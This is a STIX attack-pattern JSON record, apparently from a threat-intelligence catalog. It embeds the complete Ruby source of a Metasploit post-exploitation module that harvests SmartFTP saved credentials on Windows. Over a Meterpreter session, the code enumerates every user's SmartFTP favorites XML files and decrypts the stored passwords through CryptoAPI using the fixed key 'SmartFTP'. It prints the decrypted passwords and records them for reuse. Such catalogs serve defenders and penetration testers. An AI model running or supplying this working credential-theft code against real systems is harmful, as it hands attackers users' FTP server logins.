{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c7ba1e1-fa02-4e0e-932c-2ad0eecad596",
    "created": "2024-08-14T16:33:11.45309Z",
    "modified": "2024-08-14T16:33:11.453093Z",
    "name": "Windows Gather SmartFTP Saved Password Extraction",
    "description": " This module finds saved login credentials for the SmartFTP FTP client for windows. It finds the saved passwords and decrypts them.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/smartftp.rb",
            "external_id": "smartftp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather SmartFTP Saved Password Extraction',\n        'Description' => %q{\n          This module finds saved login credentials\n          for the SmartFTP FTP client for windows.\n          It finds the saved passwords and decrypts\n          them.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'theLightCosine'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    grab_user_profiles.each do |user|\n      next if user['AppData'].nil?\n\n      tmpath = user['AppData'] + '\\\\SmartFTP\\\\Client 2.0\\\\Favorites'\n\n      enum_subdirs(tmpath).each do |xmlfile|\n        xml = get_xml(xmlfile)\n\n        unless xml.nil?\n          # Will report the creds to DB and user\n          parse_xml(xml)\n        end\n      end\n    end\n  end\n\n  # The saved connections in SmartFTP are saved in XML files saved\n  # in a Directory with user-defineable sub-directories. This\n  # function recursively searches all sub directories for the XML files\n  def enum_subdirs(path)\n    xmlfiles = []\n\n    begin\n      session.fs.dir.foreach(path) do |sub|\n        next if sub =~ /^(\\.|\\.\\.|Predefined Favorites)$/\n\n        xmlpath = \"#{path}\\\\#{sub}\"\n\n        if sub =~ /\\.xml$/\n          xmlfiles << xmlpath\n        else\n          xmlfiles += enum_subdirs(xmlpath)\n        end\n      end\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error \"Received error code #{e.code} when enumerating #{path}\"\n    end\n\n    return xmlfiles\n  end\n\n  # We attempt to open the discovered XML files and alert the user if\n  # we cannot access the file for any reason\n  def get_xml(path)\n    connections = client.fs.file.new(path, 'r')\n\n    condata = ''\n    condata << connections.read until connections.eof\n    return condata\n  rescue Rex::Post::Meterpreter::RequestError => e\n    print_error \"Received error code #{e.code} when reading #{path}\"\n    return nil\n  end\n\n  # Extracts the saved connection data from the XML. If no password\n  # is saved, then we skip that connection. Reports the credentials\n  # back to the database\n  def parse_xml(data)\n    mxml = REXML::Document.new(data).root\n    mxml.elements.to_a('//FavoriteItem').each do |node|\n      next if node.elements['Host'].nil?\n      next if node.elements['User'].nil?\n      next if node.elements['Password'].nil?\n\n      host = node.elements['Host'].text\n      port = node.elements['Port'].text\n      user = node.elements['User'].text\n      epassword = node.elements['Password'].text\n\n      next if epassword.empty?\n\n      pass = decrypt(epassword)\n\n      print_good(\"HOST: #{host} PORT: #{port} USER: #{user} PASS: #{pass}\")\n      if session.db_record\n        source_id = session.db_record.id\n      else\n        source_id = nil\n      end\n      service_data = {\n        address: host,\n        port: port,\n        service_name: 'ftp',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n      }\n\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        private_type: :password,\n        private_data: pass,\n        username: user\n      }\n\n      credential_data.merge!(service_data)\n\n      credential_core = create_credential(credential_data)\n      login_data = {\n        core: credential_core,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      login_data.merge!(service_data)\n      login = create_credential_login(login_data)\n    end\n  end\n\n  # Hooks the Windows CryptoAPI libraries to decrypt the Passwords\n  def decrypt(password)\n    cipher = [password].pack('H*')\n    ms_enhanced_prov = 'Microsoft Enhanced Cryptographic Provider v1.0'\n    prov_rsa_full = 1\n    crypt_verify_context = 0xF0000000\n    alg_md5 = 32771\n    alg_rc4 = 26625\n\n    advapi32 = client.railgun.advapi32\n\n    acquirecontext = advapi32.CryptAcquireContextW(4, nil, ms_enhanced_prov, prov_rsa_full, crypt_verify_context)\n    createhash = advapi32.CryptCreateHash(acquirecontext['phProv'], alg_md5, 0, 0, 4)\n    hashdata = advapi32.CryptHashData(createhash['phHash'], 'SmartFTP', 16, 0)\n    derivekey = advapi32.CryptDeriveKey(acquirecontext['phProv'], alg_rc4, createhash['phHash'], 0x00800000, 4)\n    decrypted = advapi32.CryptDecrypt(derivekey['phKey'], 0, true, 0, cipher, cipher.length)\n    destroyhash = advapi32.CryptDestroyHash(createhash['phHash'])\n    destroykey = advapi32.CryptDestroyKey(derivekey['phKey'])\n    releasecontext = advapi32.CryptReleaseContext(acquirecontext['phProv'], 0)\n\n    data = decrypted['pbData']\n    data.gsub!(/\\x00/, '')\n    return data\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}